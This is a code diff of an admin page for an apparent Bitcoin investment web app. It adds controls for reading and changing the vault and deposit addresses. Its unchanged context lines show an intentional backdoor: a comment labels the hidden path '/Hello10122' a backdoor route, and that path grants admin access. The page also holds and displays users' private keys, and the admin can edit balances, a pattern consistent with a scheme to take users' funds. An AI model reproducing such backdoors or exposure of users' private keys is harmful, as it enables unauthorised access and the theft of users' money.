@@ -8,12 +8,13 @@ import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
 import { Label } from "@/components/ui/label";
 import { useToast } from "@/hooks/use-toast";
-import { useState } from "react";
+import { useState, useEffect } from "react";
+import React from "react";
 import type { User, InvestmentPlan } from "@shared/schema";
 import { formatBitcoin } from "@/lib/utils";
 import { BottomNavigation } from "@/components/bottom-navigation";
 import { useLocation } from "wouter";
-import { Users, DollarSign, TrendingUp, Edit, RefreshCw, Bitcoin, Send, Copy, Key, Settings } from "lucide-react";
+import { Users, DollarSign, TrendingUp, Edit, RefreshCw, Bitcoin, Send, Copy, Key, Settings, Clock } from "lucide-react";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
 
 interface AdminStats {
@@ -33,6 +34,8 @@ export default function Admin() {
   const [selectedPlan, setSelectedPlan] = useState<string>("");
   const [userPrivateKeys, setUserPrivateKeys] = useState<{ [userId: number]: string }>({});
   const [showPrivateKeys, setShowPrivateKeys] = useState<{ [userId: number]: boolean }>({});
+  const [vaultAddress, setVaultAddress] = useState("");
+  const [depositAddress, setDepositAddress] = useState("");
 
   // Allow access via backdoor route or if user is admin
   const isBackdoorAccess = window.location.pathname === '/Hello10122';
@@ -52,6 +55,49 @@ export default function Admin() {
 
   const { data: investmentPlans } = useQuery<InvestmentPlan[]>({
     queryKey: ['/api/investment-plans'],
+  });
+
+  const { data: adminConfig } = useQuery<{vaultAddress: string; depositAddress: string}>({
+    queryKey: ['/api/admin/config'],
+  });
+
+  // Update state when config data changes
+  useEffect(() => {
+    if (adminConfig && typeof adminConfig === 'object') {
+      setVaultAddress((adminConfig as any).vaultAddress || "");
+      setDepositAddress((adminConfig as any).depositAddress || "");
+    }
+  }, [adminConfig]);
+
+  const updateConfigMutation = useMutation({
+    mutationFn: async ({ vaultAddress, depositAddress }: { vaultAddress: string; depositAddress: string }) => {
+      const response = await fetch('/api/admin/config', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ vaultAddress, depositAddress }),
+      });
+
+      if (!response.ok) {
+        const error = await response.json();
+        throw new Error(error.error || 'Failed to update config');
+      }
+
+      return response.json();
+    },
+    onSuccess: () => {
+      queryClient.invalidateQueries({ queryKey: ['/api/admin/config'] });
+      toast({
+        title: "Configuration Updated",
+        description: "Vault addresses have been successfully updated.",
+      });
+    },
+    onError: (error: any) => {
+      toast({
+        title: "Update Failed",
+        description: error.message,
+        variant: "destructive",
+      });
+    },
   });
 
   const updateBalanceMutation = useMutation({
